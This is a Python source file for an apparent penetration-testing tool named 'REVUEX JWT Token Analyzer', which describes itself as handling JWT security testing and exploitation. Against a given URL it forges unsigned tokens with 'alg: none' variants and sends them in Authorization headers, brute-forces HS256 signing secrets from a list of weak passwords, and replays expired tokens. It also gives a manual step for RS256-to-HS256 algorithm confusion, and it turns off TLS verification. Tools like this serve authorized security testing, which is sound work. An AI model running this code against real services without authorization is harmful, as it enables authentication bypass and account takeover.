#!/usr/bin/env python3
"""
REVUEX - JWT Token Analyzer
Advanced JWT Security Testing & Exploitation

Author: G33L0
Telegram: @x0x0h33l0
"""

import requests
import json
import base64
import hmac
import hashlib
import time
from pathlib import Path
import re
import urllib3

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class JWTAnalyzer:
    """JWT token security analysis and exploitation"""

    def __init__(self, target, tokens, workspace, delay=2):
        self.target = target if target.startswith('http') else f"https://{target}"
        self.tokens = tokens if isinstance(tokens, list) else [tokens]
        self.workspace = Path(workspace)
        self.delay = delay
        self.headers = {'User-Agent': 'REVUEX-JWTAnalyzer/1.0'}
        
        self.weak_secrets = [
            'secret', 'password', '123456', 'admin', 'root', 'test', 'key', 
            'token', 'jwt', 'secret123', 'password123', 'qwerty', 'abc123',
            '1234567890', 'letmein', 'welcome', 'monkey', 'dragon', 'master'
        ]

    def analyze(self):
        vulnerabilities = []
        print(f"\n{'='*60}\n💎 REVUEX JWT Analyzer\n{'='*60}")

        for token in self.tokens:
            if not token or not self._is_jwt(token):
                continue

            print(f"→ Analyzing JWT: {token[:20]}...")
            jwt_data = self._decode_jwt(token)
            if not jwt_data: continue

            # Active Security Tests
            tests = [
                (self._test_none_algorithm, "None Algorithm"),
                (self._test_algorithm_confusion, "Alg Confusion"),
                (self._test_weak_secret, "Secret Brute-force"),
                (self._test_expiration, "Expiration Check"),
                (self._test_sensitive_data, "Sensitive Data")
            ]

            for test_func, name in tests:
                result = test_func(token, jwt_data)
                if result:
                    vulnerabilities.append(result)
                    print(f"   [!] Found: {name}")
                time.sleep(self.delay)

        self._save_results(vulnerabilities)
        return vulnerabilities

    def _is_jwt(self, token):
        return len(token.split('.')) == 3

    def _base64_encode(self, data):
        """Standard JWT URL-safe base64 encoding without padding"""
        if isinstance(data, dict):
            data = json.dumps(data).encode()
        return base64.urlsafe_b64encode(data).decode().replace('=', '')

    def _decode_jwt(self, token):
        try:
            header_b64, payload_b64, signature = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(header_b64 + '=='))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '=='))
            return {'token': token, 'header': header, 'payload': payload, 'signature': signature}
        except: return None

    def _test_none_algorithm(self, token, jwt_data):
        """Exploit alg: 'none' vulnerability"""
        header = jwt_data['header'].copy()
        header['alg'] = 'none'
        
        # Variants: none, None, NONE, nOnE
        for alg_variant in ['none', 'None', 'NONE']:
            header['alg'] = alg_variant
            payload = jwt_data['payload']
            
            # Form unsigned token: header.payload.
            unsigned_token = f"{self._base64_encode(header)}.{self._base64_encode(payload)}."
            
            check = self._test_token(unsigned_token)
            if check and check['accepted']:
                return {
                    'type': 'JWT - None Algorithm Accepted',
                    'severity': 'critical',
                    'poc': unsigned_token,
                    'description': f"Server accepts tokens with 'alg': '{alg_variant}' and no signature."
                }
        return None

    def _test_weak_secret(self, token, jwt_data):
        """Brute-force HS256 secrets"""
        if jwt_data['header'].get('alg') != 'HS256':
            return None

        header_b64, payload_b64, actual_sig = token.split('.')
        signing_input = f"{header_b64}.{payload_b64}".encode()

        for secret in self.weak_secrets:
            expected_sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
            ).decode().replace('=', '')
            
            if expected_sig == actual_sig:
                return {
                    'type': 'JWT - Weak Secret Key',
                    'severity': 'critical',
                    'description': f"JWT signed with a weak secret: '{secret}'",
                    'remediation': "Use a cryptographically strong 256-bit random key."
                }
        return None

    def _test_algorithm_confusion(self, token, jwt_data):
        """Test RSA to HMAC confusion (Public Key as Secret)"""
        if jwt_data['header'].get('alg') not in ['RS256', 'RS384', 'RS512']:
            return None
        
        # Log logic: If an attacker provides the Public Key as the HMAC secret
        # the server might verify the RSA signature using the HMAC algorithm.
        return {
            'type': 'JWT - Potential Algorithm Confusion',
            'severity': 'high',
            'description': "Token uses RS256. Verify if backend accepts HMAC using Public Key.",
            'manual_step': "Try resigning token using HS256 with the server's Public Key."
        }

    def _test_expiration(self, token, jwt_data):
        """Check if exp claim is present and valid"""
        exp = jwt_data['payload'].get('exp')
        if not exp:
            return {'type': 'JWT - Missing Expiration', 'severity': 'medium', 'description': 'Token has no expiration (exp) claim.'}
        
        if exp < time.time():
            # If server still accepts it, it's vulnerable
            check = self._test_token(token)
            if check and check['accepted']:
                return {'type': 'JWT - Expired Token Accepted', 'severity': 'high', 'description': 'Server accepts expired JWT tokens.'}
        return None

    def _test_sensitive_data(self, token, jwt_data):
        """Analyze payload for leaked info"""
        payload_str = json.dumps(jwt_data['payload']).lower()
        sensitive_keys = ['pwd', 'pass', 'admin', 'role', 'priv', 'root', 'internal']
        found = [k for k in sensitive_keys if k in payload_str]
        
        if found:
            return {'type': 'JWT - Sensitive Information Leak', 'severity': 'medium', 'found_keys': found}
        return None

    def _test_token(self, token):
        try:
            headers = self.headers.copy()
            headers['Authorization'] = f'Bearer {token}'
            response = requests.get(self.target, headers=headers, timeout=5, verify=False)
            # 200/204/302 usually indicate acceptance
            return {'accepted': response.status_code < 400, 'status': response.status_code}
        except: return None

    def _save_results(self, vulnerabilities):
        jwt_dir = self.workspace / "jwt_analysis"
        jwt_dir.mkdir(exist_ok=True, parents=True)
        output_file = jwt_dir / "jwt_vulnerabilities.json"
        with open(output_file, 'w') as f:
            json.dump({'target': self.target, 'vulnerabilities': vulnerabilities}, f, indent=2)
        print(f"\n💾 Saved to: {output_file}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python jwt_analyzer.py <url> <token>")
        sys.exit(1)
    
    # Initialize with a dummy workspace for testing
    analyzer = JWTAnalyzer(sys.argv[1], sys.argv[2], Path("./revuex_workspace"))
    analyzer.analyze()
